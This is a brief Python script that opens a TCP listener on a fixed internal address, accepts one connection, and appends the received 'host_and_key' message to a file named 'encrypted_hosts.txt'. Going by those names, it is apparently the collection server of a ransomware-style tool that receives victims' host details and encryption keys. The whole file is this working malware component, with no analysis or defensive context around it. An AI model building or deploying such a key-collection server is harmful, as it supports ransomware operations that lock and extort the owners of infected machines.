import socket


IP_ADDRESS ='10.10.100.122'
PORT=5678

print('Creating Socket')
with socket.socket(socket.AF_INET ,socket.SOCK_STREAM) as s :
    s.bind((IP_ADDRESS ,PORT))
    print("Listening for connection...")
    s.listen(1)
    conn ,addr=s.accept()
    print(f'Connection from {addr} estabilised!')
    with conn:
        while True:
            host_and_key = conn.recv(1024).decode()
            with open('encrypted_hosts.txt','a') as f:
                f.write(host_and_key+'\n')
            break
        print('connection completed and closed')